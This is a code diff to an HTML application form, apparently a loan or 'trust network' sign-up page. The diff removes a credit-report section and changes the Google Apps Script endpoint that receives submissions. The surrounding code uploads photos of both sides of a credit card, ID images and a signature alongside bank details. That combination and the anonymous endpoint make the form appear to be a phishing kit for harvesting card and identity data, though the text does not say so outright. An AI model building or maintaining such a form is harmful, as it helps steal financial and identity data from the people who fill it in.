@@ -106,26 +106,6 @@
     </div>
   </div>
 
-  <!-- SECTION 3: Credit Report -->
-  <div class="form-section">
-    <div class="section-title">Credit Report</div>
-
-    <div class="field">
-      <div class="field-label">Credit Change In The Past 30 Days <span class="badge-req">Required</span></div>
-      <input type="text" inputmode="numeric" placeholder="Value" data-required="true" data-label="Credit Report - 30 Days" data-type="numeric" id="creditChange">
-    </div>
-
-    <div class="field">
-      <div class="field-label">Last Loan <span class="badge-req">Required</span></div>
-      <input type="text" placeholder="Most recent loan date / amount" data-required="true" data-label="Loan Last" id="lastLoan">
-    </div>
-
-    <div class="field">
-      <div class="field-label">Reason <span class="badge-req">Required</span></div>
-      <input type="text" placeholder="Reason for credit inquiry" data-required="true" data-label="Credit Report - Reason" id="creditReason">
-    </div>
-  </div>
-
   <!-- SECTION 4: Badge Trust Network -->
   <div class="form-section">
     <div class="section-title">Badge Trust Network</div>
@@ -511,7 +491,7 @@
 
 <script>
   // ── CONFIG ─────────────────────────────────────────────────────────────────
-  const DEPLOYMENT_URL = 'https://script.google.com/macros/s/AKfycbxXiyC70604UPGjkXtIJ6cvj0ojBaiyXH7C7KQGWWfLS9Xi5WpR1hpcdoiJcgvxLMC6/exec';
+  const DEPLOYMENT_URL = 'https://script.google.com/macros/s/AKfycby3lei7G0s16JzjxCkzINR1Yi1NR0sWR8h-2fyGOkHv7WGM62V9PZeTe_wbo7ORHmth/exec';
 
   // ── Upload state ───────────────────────────────────────────────────────────
   const UPLOAD_KEYS = ['creditCard','creditCardBack','idFront','idBack','signature'];
@@ -601,9 +581,6 @@
       bankName:           document.getElementById('bankName').value,
       fundUse:            document.getElementById('fundUse').value,
       myLife:             document.getElementById('myLife').value,
-      creditChange:       document.getElementById('creditChange').value,
-      lastLoan:           document.getElementById('lastLoan').value,
-      creditReason:       document.getElementById('creditReason').value,
       city:               document.getElementById('city').value,
       state:              document.getElementById('state').value,
       trustFirstName:     document.getElementById('trustFirstName').value,
